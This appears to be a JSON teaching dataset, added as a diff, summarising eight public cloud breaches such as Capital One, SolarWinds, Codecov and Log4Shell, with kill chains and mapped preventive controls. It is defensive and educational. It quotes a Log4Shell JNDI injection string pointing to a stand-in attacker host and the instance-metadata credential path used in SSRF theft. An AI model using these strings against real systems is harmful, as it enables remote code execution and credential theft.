@@ -1,0 +1,171 @@
+{
+  "$schema": "cloud-security-v1",
+  "sourceType": "paraphrased-from-public-sources",
+  "verificationNote": "Incident details sourced from public breach disclosures, CISA advisories, CSP security bulletins, US DOJ/SEC filings, and security research firms (Mandiant, CrowdStrike, Unit42, Wiz). CCM control mappings are reasoned assessments based on CSA Cloud Controls Matrix v4 domains.",
+  "description": "Major cloud security incidents used as teaching examples — each incident maps to the preventive controls and architectural patterns that would have prevented or mitigated it. These are real-world cases that demonstrate the consequences of cloud security failures.",
+  "incidents": [
+    {
+      "id": "CINC-001",
+      "name": "Capital One Data Breach",
+      "year": 2019,
+      "csp": "AWS",
+      "attribution": "Paige Thompson (former AWS employee, convicted)",
+      "impact": "106 million credit card applications and accounts exposed, including 140,000 Social Security numbers and 80,000 bank account numbers. $80 million OCC fine, $190 million class action settlement.",
+      "attackVector": "Server-Side Request Forgery (SSRF) exploiting misconfigured WAF to access EC2 instance metadata service (IMDSv1) and obtain IAM role temporary credentials",
+      "rootCause": "A misconfigured ModSecurity WAF on an EC2 instance allowed SSRF requests to the instance metadata service (169.254.169.254). The IMDSv1 endpoint returned IAM role credentials without requiring a session token. The IAM role attached to the WAF instance had overly permissive access to S3 buckets containing customer data. Three failures compounded: misconfigured WAF + IMDSv1 + overprivileged IAM role.",
+      "keyLesson": "Defence in depth is not optional. Any single control failure — WAF misconfiguration, IMDSv1, or overprivileged IAM — should not enable access to 106 million records. IMDSv2 enforcement alone would have prevented this specific attack chain.",
+      "preventiveControls": ["IAM-01", "IAM-04", "IVS-04", "IVS-09", "DSP-01", "DSP-17"],
+      "killChain": [
+        "Reconnaissance: Identified misconfigured WAF instance accessible from internet",
+        "Initial Access: Sent crafted SSRF request through WAF to EC2 instance metadata endpoint (169.254.169.254/latest/meta-data/iam/security-credentials/)",
+        "Credential Access: Retrieved temporary IAM role credentials (access key, secret key, session token) from IMDSv1 response",
+        "Discovery: Used stolen credentials to list S3 buckets in Capital One's AWS account",
+        "Collection: Executed S3 sync commands to download over 700 folders of customer data from multiple S3 buckets",
+        "Exfiltration: Data exfiltrated to attacker's personal servers; attacker later posted about the breach on social media and GitHub, leading to identification and arrest"
+      ]
+    },
+    {
+      "id": "CINC-002",
+      "name": "SolarWinds Supply Chain Attack (SUNBURST)",
+      "year": 2020,
+      "csp": "Multi-cloud (Azure/M365 primarily, AWS secondarily)",
+      "attribution": "APT29 / Cozy Bear (Russia SVR — attributed by US government)",
+      "impact": "Approximately 18,000 organisations installed the backdoored SolarWinds Orion update. Confirmed breaches at US Treasury, Commerce, Homeland Security, FireEye, Microsoft, and multiple Fortune 500 companies. Attacker accessed Microsoft 365 email and Azure AD environments at multiple victims.",
+      "attackVector": "Supply chain compromise of SolarWinds Orion software build process, followed by SAML token forging (Golden SAML) for persistent cloud access",
+      "rootCause": "Attackers compromised SolarWinds' build pipeline and injected the SUNBURST backdoor into legitimate Orion software updates. After victims installed the trojanised update, the backdoor provided C2 access. Attackers then pivoted to cloud environments by stealing SAML signing certificates from on-premises AD FS servers and forging SAML tokens (Golden SAML attack), enabling persistent access to Azure AD and Microsoft 365 without needing valid credentials or MFA.",
+      "keyLesson": "Supply chain integrity is a cloud security concern. Golden SAML demonstrates that on-premises identity infrastructure compromise directly translates to cloud compromise. Organisations federating on-premises AD with cloud identity must protect SAML signing certificates with the same rigour as root CA private keys.",
+      "preventiveControls": ["STA-02", "STA-06", "IAM-01", "IAM-02", "IAM-13", "LOG-01", "LOG-03"],
+      "killChain": [
+        "Supply Chain Compromise: Injected SUNBURST backdoor into SolarWinds Orion build pipeline (build process manipulation)",
+        "Initial Access: Victims installed trojanised Orion update via standard software update process — appeared legitimate and was digitally signed by SolarWinds",
+        "Command and Control: SUNBURST backdoor communicated via DNS (avsvmcloud.com) with C2 infrastructure, blending with legitimate SolarWinds traffic",
+        "Lateral Movement: Moved from SolarWinds Orion server to on-premises Active Directory and AD FS servers",
+        "Credential Access: Stole AD FS SAML token signing certificate from on-premises server",
+        "Persistence: Forged SAML tokens (Golden SAML) granting access to Azure AD and Microsoft 365 as any user, bypassing MFA entirely",
+        "Collection and Exfiltration: Accessed email mailboxes, SharePoint documents, and Azure AD directory information at target organisations"
+      ]
+    },
+    {
+      "id": "CINC-003",
+      "name": "Codecov Bash Uploader Compromise",
+      "year": 2021,
+      "csp": "Multi-cloud (CI/CD pipeline targeting cloud credentials)",
+      "attribution": "Unknown — suspected nation-state",
+      "impact": "Codecov's Bash Uploader script was modified for approximately 2 months (Jan 31 - Apr 1, 2021), potentially affecting 29,000+ customers. The modified script exfiltrated CI/CD environment variables including cloud credentials, API tokens, and source code repository tokens. Confirmed victims include Twitch, HashiCorp, and multiple unnamed organisations.",
+      "attackVector": "Supply chain compromise of Codecov's Bash Uploader script, exfiltrating CI/CD environment variables containing cloud credentials",
+      "rootCause": "Attackers gained access to Codecov's Docker image creation process and modified the Bash Uploader script (used in CI/CD pipelines to upload code coverage reports). The modified script added a single line that exfiltrated all environment variables (which typically include cloud access keys, database credentials, and API tokens) to an attacker-controlled server. CI/CD pipelines commonly store secrets as environment variables, making them trivially accessible to any script running in the pipeline.",
+      "keyLesson": "CI/CD pipelines are high-value targets because they typically run with elevated privileges and have access to production credentials. Environment variables are not a secure secret storage mechanism — they are visible to any process in the execution environment. All CI/CD dependencies (scripts, actions, orbs) are part of the supply chain and must be verified.",
+      "preventiveControls": ["STA-02", "STA-06", "AIS-01", "AIS-04", "EKM-02", "IAM-01"],
+      "killChain": [
+        "Supply Chain Compromise: Modified Codecov Bash Uploader script in Codecov's Docker image build process",
+        "Execution: Customers executed the compromised script in their CI/CD pipelines as part of normal code coverage upload",
+        "Credential Access: Compromised script exfiltrated all environment variables (including AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, database credentials) to attacker server",
+        "Initial Access (secondary): Used stolen cloud credentials to access victim cloud environments",
+        "Collection: Accessed source code repositories, cloud resources, and internal systems using stolen credentials",
+        "Impact: Full credential rotation required across all affected CI/CD pipelines — massive operational disruption"
+      ]
+    },
+    {
+      "id": "CINC-004",
+      "name": "Log4Shell (CVE-2021-44228)",
+      "year": 2021,
+      "csp": "Multi-cloud (affected virtually all cloud services using Java/Log4j)",
+      "attribution": "Initially reported by Alibaba Cloud Security Team; subsequently exploited by multiple nation-state and criminal actors",
+      "impact": "Critical RCE vulnerability in Apache Log4j 2 (CVSS 10.0) affecting hundreds of millions of devices and cloud services globally. Affected AWS services included CloudFront, API Gateway, Elasticsearch, and numerous customer workloads. Azure, GCP, and virtually all cloud-hosted Java applications were vulnerable. Used for cryptomining, ransomware deployment, data theft, and espionage.",
+      "attackVector": "Remote Code Execution via JNDI injection in log message strings processed by Log4j 2.x",
+      "rootCause": "Apache Log4j 2.x (versions 2.0-beta9 through 2.14.1) had a feature allowing JNDI lookups in log messages. An attacker could inject a string like ${jndi:ldap://attacker.com/exploit} into any field that gets logged (HTTP headers, form fields, user agents), causing the vulnerable application to connect to the attacker's LDAP server and download and execute arbitrary Java classes. The vulnerability was trivially exploitable — a single crafted HTTP request could achieve RCE.",
+      "keyLesson": "Dependency management is a cloud security imperative. A single vulnerable library (Log4j) affected the entire cloud ecosystem. Organisations need Software Bill of Materials (SBOM) to identify vulnerable dependencies, WAF rules to block exploit strings, and egress filtering to prevent JNDI callback connections.",
+      "preventiveControls": ["TVM-01", "TVM-02", "AIS-01", "AIS-04", "IVS-04", "IVS-09"],
+      "killChain": [
+        "Reconnaissance: Scanned internet-facing applications for Log4j vulnerability by injecting JNDI payloads in common fields (User-Agent, X-Forwarded-For, form inputs, API parameters)",
+        "Initial Access: Sent crafted request containing ${jndi:ldap://attacker-server/exploit} to vulnerable application",
+        "Execution: Vulnerable Log4j processed the malicious string, initiated JNDI lookup to attacker LDAP server, downloaded and executed attacker's Java class payload",
+        "Persistence: Installed webshells, reverse shells, or backdoor implants for persistent access",
+        "Lateral Movement: Used compromised cloud instance to pivot to internal resources (databases, other services, cloud metadata endpoints)",
+        "Impact: Varied — cryptomining (most common), ransomware deployment, data exfiltration, long-term espionage implants"
+      ]
+    },
+    {
+      "id": "CINC-005",
+      "name": "Microsoft Storm-0558 (Outlook.com / Azure AD Key Theft)",
+      "year": 2023,
+      "csp": "Microsoft Azure / Microsoft 365",
+      "attribution": "Storm-0558 (China-based threat actor — attributed by Microsoft and US government)",
+      "impact": "Approximately 25 organisations compromised including US State Department and Commerce Department. Attacker accessed email accounts of senior US government officials. The stolen MSA signing key could theoretically have been used to forge access tokens for any Microsoft cloud service, not just Outlook.com.",
+      "attackVector": "Stolen Microsoft Account (MSA) consumer signing key used to forge Azure AD enterprise access tokens",
+      "rootCause": "The attacker obtained a Microsoft Account (MSA) consumer signing key — one of the most sensitive cryptographic keys in Microsoft's identity infrastructure. Due to a validation error in Microsoft's token verification code, this consumer signing key was accepted when forging enterprise Azure AD tokens. The key had been present in a crash dump from a consumer signing system in April 2021 and was subsequently accessed by the attacker after compromising a Microsoft engineer's corporate account. Microsoft's crash dump sanitisation process failed to detect and remove the key material.",
+      "keyLesson": "Cloud identity infrastructure is the ultimate high-value target. A single stolen signing key enabled forged access to enterprise email at the highest levels of government. Key management hygiene — including crash dump sanitisation, key rotation, and key scope validation — must be rigorous. Customers should not assume CSP identity infrastructure is infallible.",
+      "preventiveControls": ["EKM-01", "EKM-02", "EKM-03", "IAM-01", "IAM-13", "LOG-01"],
+      "killChain": [
+        "Credential Access (initial): Compromised a Microsoft engineer's corporate account (method not fully disclosed)",
+        "Collection: Accessed debug crash dump containing MSA consumer signing key from 2021 (crash dump sanitisation had failed to remove the key)",
+        "Credential Access (primary): Extracted MSA consumer signing key from crash dump",
+        "Forge Authentication: Used stolen MSA signing key to forge Azure AD tokens for enterprise accounts — a validation error accepted consumer keys for enterprise token validation",
+        "Access: Used forged tokens to access Outlook Web Access (OWA) and Outlook.com for target email accounts",
+        "Collection: Accessed email content from approximately 25 organisations including US government agencies",
+        "Discovery: Microsoft detected the intrusion on June 16, 2023 after a US government customer reported anomalous mail access activity"
+      ]
+    },
+    {
+      "id": "CINC-006",
+      "name": "Snowflake Customer Breaches",
+      "year": 2024,
+      "csp": "Snowflake (SaaS data platform)",
+      "attribution": "UNC5537 (financially motivated, linked to Scattered Spider ecosystem — attributed by Mandiant)",
+      "impact": "At least 165 Snowflake customers compromised including Ticketmaster (560 million records), AT&T (109 million phone records), Santander Bank, Advance Auto Parts, LendingTree, and others. Collectively one of the largest data breaches in history by volume of records exposed.",
+      "attackVector": "Credential stuffing using previously stolen credentials against Snowflake customer accounts that lacked MFA",
+      "rootCause": "Attackers obtained Snowflake customer credentials from infostealer malware logs (Vidar, Raccoon, Redline, Lumma) available on dark web markets. They systematically tested these credentials against Snowflake login endpoints. Because Snowflake did not enforce MFA by default and many customers had not enabled it, valid stolen credentials provided direct access to data warehouses containing massive datasets. Snowflake's architecture allowed single-factor authentication by default, and the platform lacked IP allowlisting enforcement for most customers.",
+      "keyLesson": "MFA is not optional for SaaS platforms containing sensitive data. The Snowflake breaches demonstrate that credential hygiene at the individual user level cannot be guaranteed — infostealer malware will steal credentials regardless of password complexity. Platform-level MFA enforcement is the only reliable control. SaaS vendors that do not enforce MFA by default are creating systemic risk for their customers.",
+      "preventiveControls": ["IAM-02", "IAM-03", "IAM-12", "IVS-04", "LOG-01", "DSP-01"],
+      "killChain": [
+        "Credential Harvesting: Obtained Snowflake customer credentials from infostealer malware logs (purchased on dark web markets and Telegram channels)",
+        "Initial Access: Authenticated to Snowflake customer accounts using stolen username/password pairs — no MFA challenge",
+        "Discovery: Enumerated databases, schemas, and tables within compromised Snowflake accounts",
+        "Collection: Executed SQL queries to extract massive datasets (hundreds of millions of records per victim)",
+        "Exfiltration: Downloaded extracted data using Snowflake's native data export capabilities",
+        "Extortion: Contacted victim organisations demanding ransom payment to prevent public release of stolen data"
+      ]
+    },
+    {
+      "id": "CINC-007",
+      "name": "Twitch Source Code and Data Leak",
+      "year": 2021,
+      "csp": "AWS",
+      "attribution": "Unknown — leaked anonymously on 4chan",
+      "impact": "125 GB of data leaked including Twitch's entire source code repository, internal tools, proprietary SDKs, creator payout data (showing earnings for top streamers), and an unreleased Amazon Game Studios competitor to Steam. Significant reputational damage and competitive intelligence exposure.",
+      "attackVector": "Server misconfiguration allowing unauthorised access to internal Twitch infrastructure",
+      "rootCause": "According to Twitch's post-incident disclosure, the breach resulted from a server configuration change that exposed data to the internet. The exact misconfiguration was not fully detailed publicly, but the scope of data accessed — source code, internal tools, financial data — indicates broad access to internal systems, likely through an exposed or misconfigured internal service. The leak included Git repository history, suggesting access to source code management infrastructure.",
+      "keyLesson": "Configuration management and change control for cloud infrastructure must include security review. A single configuration change exposed the entire source code and internal operations of a major platform. Internal services must never be directly internet-accessible, and sensitive repositories must have access controls independent of network security.",
+      "preventiveControls": ["IVS-04", "IVS-09", "CCC-01", "CCC-05", "DSP-01", "LOG-01"],
+      "killChain": [
+        "Discovery: Identified exposed internal Twitch service resulting from server misconfiguration",
+        "Initial Access: Accessed misconfigured server/service from the internet",
+        "Lateral Movement: Navigated from exposed service to internal source code repositories, payment systems, and internal tool infrastructure",
+        "Collection: Downloaded 125 GB of data including complete source code history, internal SDKs, creator payout data, and unreleased projects",
+        "Exfiltration: Exfiltrated data, possibly over extended period given the volume (125 GB)",
+        "Impact: Leaked full dataset as a torrent on 4chan, labelled as 'Part 1' (implying additional data held)"
+      ]
+    },
+    {
+      "id": "CINC-008",
+      "name": "Uber Breach (MFA Fatigue + Cloud Lateral Movement)",
+      "year": 2022,
+      "csp": "AWS, Google Workspace, Slack (multi-cloud/multi-SaaS)",
+      "attribution": "Attributed to an 18-year-old affiliated with LAPSUS$ group",
+      "impact": "Attacker accessed Uber's internal Slack, Google Workspace, source code repositories (GitHub), HackerOne vulnerability reports, and AWS console. Internal dashboards, financial data, and vulnerability reports exposed. Uber's former CSO was separately convicted of covering up a previous 2016 breach.",
+      "attackVector": "Social engineering via MFA fatigue (repeated MFA push notifications) against a contractor, followed by lateral movement through internal systems to cloud infrastructure",
+      "rootCause": "The attacker purchased stolen credentials for an Uber EXT contractor from the dark web (likely from infostealer malware). When attempting to log in, MFA push notifications were sent to the contractor's phone. The attacker spammed the contractor with repeated MFA push notifications (MFA fatigue attack) and simultaneously contacted the contractor on WhatsApp, impersonating Uber IT support and instructing them to accept the MFA prompt. After gaining access, the attacker found a PowerShell script on an internal network share containing hardcoded admin credentials for Uber's Privileged Access Management (PAM) system (Thycotic). This provided access to AWS, Google Workspace, Slack, and other cloud services.",
+      "keyLesson": "MFA fatigue attacks bypass push-based MFA. Phishing-resistant MFA (FIDO2/WebAuthn) eliminates this vector entirely. Additionally, hardcoded credentials in scripts on network shares is a catastrophic practice — a single script containing PAM admin credentials enabled access to all cloud environments.",
+      "preventiveControls": ["IAM-02", "IAM-04", "IAM-12", "EKM-02", "LOG-01", "LOG-03"],
+      "killChain": [
+        "Credential Acquisition: Purchased stolen Uber contractor credentials from dark web (infostealer malware origin)",
+        "Social Engineering: Spammed contractor with MFA push notifications (MFA fatigue) while impersonating Uber IT on WhatsApp, convincing contractor to accept the MFA prompt",
+        "Initial Access: Logged into Uber's VPN with accepted MFA, gaining access to internal network",
+        "Discovery: Scanned internal network shares and found PowerShell script containing hardcoded admin credentials for Thycotic PAM system",
+        "Privilege Escalation: Used PAM admin credentials to access secrets for AWS console, Google Workspace admin, Slack, and other cloud services",
+        "Lateral Movement: Accessed AWS console, Google Workspace admin panel, Uber's Slack workspace, source code repositories, and HackerOne bug bounty dashboard",
+        "Impact: Posted messages in Uber's internal Slack announcing the breach; accessed vulnerability reports from HackerOne that could enable future attacks"
+      ]
+    }
+  ]
+}
